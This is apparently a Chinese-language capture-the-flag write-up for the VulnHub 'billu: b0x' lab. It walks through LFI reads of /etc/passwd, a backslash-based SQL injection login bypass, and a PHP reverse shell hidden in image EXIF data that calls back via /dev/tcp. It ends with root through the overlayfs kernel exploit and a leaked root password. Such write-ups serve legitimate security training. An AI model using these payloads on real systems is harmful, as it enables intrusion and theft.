# billu: b0x

2024-6-6 https://www.vulnhub.com/entry/billu-b0x,188/

difficulty: medium

## IP

192.168.10.192

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 facfa252c4faf575a7e2bd60833e7bde (DSA)
|   2048 88310c789880ef33fa2622edd09bbaf8 (RSA)
|_  256 0e5e330350c91eb3e75139a44a1064ca (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: --==[[IndiShell Lab]]==--
```

直接看 80 web 服务，http://192.168.10.192/ 主页是个登陆页面，尝试 sql 注入测试 `' or 1=1 -- -`，暂时没发现。

先用 gobuster 扫描看看：

```
http://192.168.10.192/images               (Status: 301) [Size: 317] [--> http://192.168.10.192/images/]
http://192.168.10.192/c                    (Status: 200) [Size: 1]
http://192.168.10.192/c.php                (Status: 200) [Size: 1]
http://192.168.10.192/in.php               (Status: 200) [Size: 47528]
http://192.168.10.192/in                   (Status: 200) [Size: 47524]
http://192.168.10.192/show.php             (Status: 200) [Size: 1]
http://192.168.10.192/show                 (Status: 200) [Size: 1]
http://192.168.10.192/add.php              (Status: 200) [Size: 307]
http://192.168.10.192/add                  (Status: 200) [Size: 307]
http://192.168.10.192/test.php             (Status: 200) [Size: 72]
http://192.168.10.192/test                 (Status: 200) [Size: 72]
http://192.168.10.192/index                (Status: 200) [Size: 3267]
http://192.168.10.192/index.php            (Status: 200) [Size: 3267]
http://192.168.10.192/head.php             (Status: 200) [Size: 2793]
http://192.168.10.192/head                 (Status: 200) [Size: 2793]
http://192.168.10.192/uploaded_images      (Status: 301) [Size: 326] [--> http://192.168.10.192/uploaded_images/]
http://192.168.10.192/panel                (Status: 302) [Size: 2469] [--> index.php]
http://192.168.10.192/panel.php            (Status: 302) [Size: 2469] [--> index.php]
http://192.168.10.192/head2.php            (Status: 200) [Size: 2468]
http://192.168.10.192/head2                (Status: 200) [Size: 2468]
```

扫出的目录较多。

http://192.168.10.192/in.php 是 phpinfo 页面。

http://192.168.10.192/test.php 提示 'file' parameter is empty. Please provide file path in 'file' parameter，这里可能存在 LFI，进行尝试，get 方式不行，使用 POST 可以看到 /etc/passwd 的文件内容：

```
curl --data-urlencode 'file=/etc/passwd' http://192.168.10.192/test.php

root:x:0:0:root:/root:/bin/bash
...
ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
```

其他的几个扫描出的链接，都没看到可利用点，看看上面的 LFI 能否读取到 apache2 的日志文件或者.ssh 中的文件：

```
curl --data-urlencode 'file=/var/log/apache2/access.log' http://192.168.10.192/test.php

curl --data-urlencode 'file=/home/ica/.ssh/authorized_keys' http://192.168.10.192/test.php
```

没有发现重点的可 LFI 的文件。

尝试用 LFI 读取一下 index.php、add.php 等几个 php 文件。

发现需要登陆后，才能看到 panel 的信息，查看 index.php 源码：

```
curl --data-urlencode 'file=index.php' http://192.168.10.192/test.php

if(isset($_POST['login']))
{
	$uname=str_replace('\'','',urldecode($_POST['un']));
	$pass=str_replace('\'','',urldecode($_POST['ps']));
	$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
	$result = mysqli_query($conn, $run);

if (mysqli_num_rows($result) > 0) {
    $row = mysqli_fetch_assoc($result);
	echo "You are allowed<br>";
	$_SESSION['logged']=true;
	$_SESSION['admin']=$row['username'];

	header('Location: panel.php', true, 302);
}
```

最开始对 un 和 ps 进行的单引号替换 str_replace，所以需要进行单引号必合绕过。

构造 un 和 ps, Username `or 1=1 -- -` Password `\` ，这样利用`\` 就能把 pass 后面拼接的单引号个注释，然后直接连接到 uname 后的单引号，然后就可以在 uname 处设置 sql 注入的语句：

```
select * from auth where pass='\' and uname=' or 1=1 -- -
```

`'\' and uname='` 这时是一个整体字符串，or 1=1 直接绕过了 name 和 pass 的验证。

按照上面的值进行输入，进入了系统。

看到有一个 show user 的选项卡，点击 continue 后可以看到用户的信息和图片，点击 add user 就看到了前面的 add.php 中显示的内容，这里就可以上传图片，看看这里能否进行上传绕过，传入 php web shell，先使用前面 LFI 看看 panel 的上传逻辑：

```php
curl --data-urlencode 'file=panel.php' http://192.168.10.192/test.php

if(isset($_POST['continue']))
{
	$dir=getcwd();
	$choice=str_replace('./','',$_POST['load']);

	if($choice==='add')
	{
       		include($dir.'/'.$choice.'.php');
			die();
	}

        if($choice==='show')
	{
		include($dir.'/'.$choice.'.php');
		die();
	}
	else
	{
		include($dir.'/'.$_POST['load']);   # 当continue不为add或show时，这里可以设置load的值为任意值，实现文件包含，进而解析php代码
	}
}

if(isset($_POST['upload']))
{
	$name=mysqli_real_escape_string($conn,$_POST['name']);
	$address=mysqli_real_escape_string($conn,$_POST['address']);
	$id=mysqli_real_escape_string($conn,$_POST['id']);

	if(!empty($_FILES['image']['name']))
	{
	    $iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
	    $r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
	    $image=array('jpeg','jpg','gif','png');
	if(in_array($r,$image))
	{
		$finfo = @new finfo(FILEINFO_MIME);
	    $filetype = @$finfo->file($_FILES['image']['tmp_name']);
		if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
				{
					if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
							 {
							  echo "Uploaded successfully ";
							  $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')';
							 mysqli_query($conn, $update);

							}
				}
			else
			{
				echo "<br>i told you dear, only png,jpg and gif file are allowed";
			}
	}
	else
	{
		echo "<br>only png,jpg and gif file are allowed";

	}
}
```

图片上传这里，验证了 filetype，对文件后缀名使用了白名单，只能是那几个图片后缀，没办法保存为 php 后缀的文件。

所以这里就先了用图片上传功能，把 php 代码写入到图片中，然后利用前面的 include 功能，将图片马执行。

将字符合并到图片的方式很多，这里使用 exiftool:

```
exiftool -Comment="<?php exec(\"/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.10.3/8888 0>&1'\")?>" shell.jpg
```

然后将图片通过上面的 add user 功能添加到 uploaded_images 路径中，已经能看到 shell.jpg 了。然后构造文件包含的路径，并在 kali 上监听 8888 端口：

```
load 修改为 uploaded_images/shell.jpg

curl --data-urlencode "continue=continue" --data-urlencode "load=uploaded_images/shell.jpg" -b "PHPSESSID=4b628a9ru2tlc8m47la36ncmq5" http://192.168.10.192/panel.php
# 别忘记要加 cookie 因为是在登陆情况下才能访问panel.php
```

执行后，得到了反弹的 web shell:

```
www-data@indishell:/var/www$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

先用 python 升级下 tty。

c.php 中看到了数据库的配置信息：

```
$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
```

但是这个密码不是 ica 的密码。

进行系统枚举，sudo 无，suid 无， crontab 无， pspy 也没发现隐藏的定时任务。内核版本 3.13.0-32-generic Ubuntu 12.04.5 LTS 较低大概率存在内核提权，尝试下这 2 个：

```
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation  | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow) | linux/local/37293.txt
```

使用 37292.c，下载到目标机器，进行编译，执行，得到了 root 权限：

```
www-data@indishell:/tmp$ gcc 37292.ofs.c -o exp
www-data@indishell:/tmp$ ./exp
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

另外一种提权到 root 的方式，在 /var/www/phpmy 中找到了 config.inc.php 文件：

```
$cfg['Servers'][$i]['auth_type'] = 'cookie';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'roottoor';
$cfg['Servers'][$i]['AllowNoPassword'] = true;
```

发现了一个密码 roottoor 尝试 su 切换到 ica 没有成功，在尝试切换到 root ，切换成功。
